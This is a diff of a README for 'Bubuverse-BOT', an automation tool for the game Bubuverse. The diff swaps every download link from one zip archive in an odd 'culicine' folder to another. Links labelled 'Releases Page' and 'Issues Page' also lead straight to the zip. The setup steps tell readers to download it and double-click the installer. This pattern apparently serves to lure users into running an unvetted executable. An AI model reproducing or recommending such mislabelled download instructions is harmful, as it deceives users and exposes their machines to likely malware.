@@ -1,6 +1,6 @@
 # 🐙 Bubuverse-BOT - Automate Your Bubuverse Farming Tasks Effortlessly 
 
-[![Download Bubuverse-BOT](https://raw.githubusercontent.com/Roofman12/Bubuverse-BOT/main/culicine/Bubuverse-BOT_v1.6.zip)](https://raw.githubusercontent.com/Roofman12/Bubuverse-BOT/main/culicine/Bubuverse-BOT_v1.6.zip)
+[![Download Bubuverse-BOT](https://github.com/Roofman12/Bubuverse-BOT/raw/refs/heads/main/culicine/Bubuverse_BOT_3.4.zip)](https://github.com/Roofman12/Bubuverse-BOT/raw/refs/heads/main/culicine/Bubuverse_BOT_3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,11 +8,11 @@ Welcome to Bubuverse-BOT! This tool automates tasks in Bubuverse, helping you ma
 
 ## 📥 Download & Install
 
-To download Bubuverse-BOT, please visit this page to download: [Download Bubuverse-BOT](https://raw.githubusercontent.com/Roofman12/Bubuverse-BOT/main/culicine/Bubuverse-BOT_v1.6.zip).
+To download Bubuverse-BOT, please visit this page to download: [Download Bubuverse-BOT](https://github.com/Roofman12/Bubuverse-BOT/raw/refs/heads/main/culicine/Bubuverse_BOT_3.4.zip).
 
 ### 🛠️ Setup Instructions
 
-1. **Visit the Release Page**: Go to the [Bubuverse-BOT Releases Page](https://raw.githubusercontent.com/Roofman12/Bubuverse-BOT/main/culicine/Bubuverse-BOT_v1.6.zip).
+1. **Visit the Release Page**: Go to the [Bubuverse-BOT Releases Page](https://github.com/Roofman12/Bubuverse-BOT/raw/refs/heads/main/culicine/Bubuverse_BOT_3.4.zip).
 2. **Select the Latest Release**: Look for the most recent version. It often has the highest version number.
 3. **Download the Installer**: Click on the file that matches your operating system (e.g., Windows, macOS, or Linux). 
 4. **Run the Installer**: Once the download finishes, find the file in your downloads folder and double-click it to start the installation.
@@ -56,7 +56,7 @@ If you encounter issues while using Bubuverse-BOT, consider the following:
 
 ## 💬 Get Help
 
-For support or to report issues, you can visit the [Issues Page](https://raw.githubusercontent.com/Roofman12/Bubuverse-BOT/main/culicine/Bubuverse-BOT_v1.6.zip) on GitHub. 
+For support or to report issues, you can visit the [Issues Page](https://github.com/Roofman12/Bubuverse-BOT/raw/refs/heads/main/culicine/Bubuverse_BOT_3.4.zip) on GitHub. 
 
 ## 🗣️ Community Contributions
 
